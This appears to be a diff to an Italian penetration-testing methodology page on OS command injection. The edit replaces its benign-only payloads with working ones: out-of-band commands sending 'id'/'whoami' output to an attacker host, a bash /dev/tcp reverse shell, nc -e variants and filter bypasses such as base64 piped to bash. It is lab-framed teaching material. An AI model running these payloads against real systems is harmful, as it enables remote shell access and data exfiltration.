@@ -5,7 +5,7 @@
 > - **Fase:** Web Exploitation - OWASP A03:2021 Injection (input dell'utente concatenato in un comando di sistema)
 > - **Visibilita:** Media/Alta - il processo web genera processi figli shell (pattern molto rilevabile da EDR/auditd); le varianti blind generano traffico in uscita o ritardi misurabili
 > - **Prerequisiti:** un'applicazione che costruisce ed esegue un comando di sistema includendo input dell'utente (ping, conversioni, utility, chiamate a binari esterni)
-> - **Natura del documento:** metodologia. Payload illustrativi e benigni (solo comandi di verifica tipo `id`/`whoami`), nessuna reverse shell riprodotta, nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).
+> - **Natura del documento:** metodologia + payload pratici (verifica, blind/OOB, reverse shell) per ambiente di laboratorio. Nessuna azione distruttiva (no wiping/DoS); nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).
 
 - Obiettivo: eseguire comandi arbitrari sul sistema operativo del server sfruttando la concatenazione non sicura di input dell'utente in una chiamata a shell; qui limitato a comandi di verifica non distruttivi.
 
@@ -55,14 +55,36 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- 'id' eseguito: comma
 L'esecuzione di `id`/`whoami` conferma la RCE con i privilegi del processo web. I separatori comuni sono `;`,
 `|`, `&&`, `$()` e i backtick; la scelta dipende dal contesto (shell, filtri presenti).
 
-### Fase 2 - Variante blind (concettuale)
+### Fase 2 - Variante blind (time-based e out-of-band)
 
-Se l'output non e riflesso, si conferma indirettamente: un comando che introduce un **ritardo misurabile**
-(time-based) o che effettua una **richiesta in uscita** verso un server controllato (out-of-band). Si verifica
-l'esecuzione dal ritardo o dalla richiesta ricevuta, senza bisogno di vedere l'output nella risposta.
+Se l'output non e riflesso, si conferma l'esecuzione in modo indiretto:
 
-> Nota: non vengono riprodotte reverse shell ne catene di post-exploitation. La conferma dell'esecuzione (con
-> comandi benigni) e sufficiente a dimostrare l'impatto in un assessment.
+```bash
+# Time-based: ritardo misurabile nella risposta
+127.0.0.1; sleep 10
+127.0.0.1 && ping -c 10 127.0.0.1
+
+# Out-of-band (OOB): richiesta in uscita verso un host controllato (DNS/HTTP), osservata nei propri log
+127.0.0.1; nslookup $(whoami).attacker.lab
+127.0.0.1; curl http://10.10.14.5/$(id | base64 -w0)
+```
+
+Un ritardo di ~10s o una richiesta ricevuta sul proprio server confermano la RCE anche senza output in risposta.
+
+### Fase 3 - Da RCE a shell interattiva (lab)
+
+Confermata la RCE, in laboratorio si ottiene una shell. Reverse shell bash (listener `nc -lvnp 4444`
+sull'attaccante, IP/porta di lab):
+
+```bash
+# valore iniettato nel parametro vulnerabile
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+```
+
+Varianti quando bash non e disponibile o e filtrata: `nc -e /bin/sh 10.10.14.5 4444`, `mkfifo`, reverse shell
+Python/PHP (vedi [07-post-exploitation](<../../../07-post-exploitation/README.md>) e la pagina netcat). Bypass
+filtri comuni: concatenazione (`w'h'oami`), separatori alternativi, `$IFS` al posto degli spazi, encoding del
+comando in base64 con `echo ... | base64 -d | bash`.
 
 ## Analisi dei risultati
 
@@ -165,8 +187,9 @@ argomenti a livello di API.
 ## Note di metodologia
 
 In lab reale (es. DVWA, WebGoat o un target con funzionalita di rete) i dati da documentare come finding: la
-conferma dell'esecuzione (con comando benigno), il contesto dei privilegi e l'eventuale percorso di escalation,
-senza riprodurre reverse shell o azioni distruttive. Le evidenze vanno raccolte con comandi non distruttivi.
+conferma dell'esecuzione, il contesto dei privilegi, la shell ottenuta e l'eventuale percorso di escalation. Le
+tecniche sono funzionanti: vanno eseguite solo in lab proprio o con autorizzazione, evitando azioni distruttive
+(wiping, DoS) che esulano dallo scopo di un assessment.
 
 ## Mappatura MITRE ATT&CK
 
@@ -188,4 +211,4 @@ senza riprodurre reverse shell o azioni distruttive. Le evidenze vanno raccolte 
 
 ---
 
-> **Nota:** Contenuto didattico e di metodologia. Le tecniche vanno eseguite esclusivamente su applicazioni di proprieta o con autorizzazione esplicita. I payload sono di sola verifica (comandi benigni); nessuna reverse shell o azione distruttiva e riprodotta. Gli output sono illustrativi.
+> **Nota:** Contenuto didattico. I payload sono funzionanti (verifica, blind/OOB, reverse shell) e vanno eseguiti esclusivamente su applicazioni di proprieta o con autorizzazione esplicita, in ambiente di laboratorio. IP/porte sono valori di lab; nessuna azione distruttiva (wiping/DoS) e inclusa. Gli output sono illustrativi.
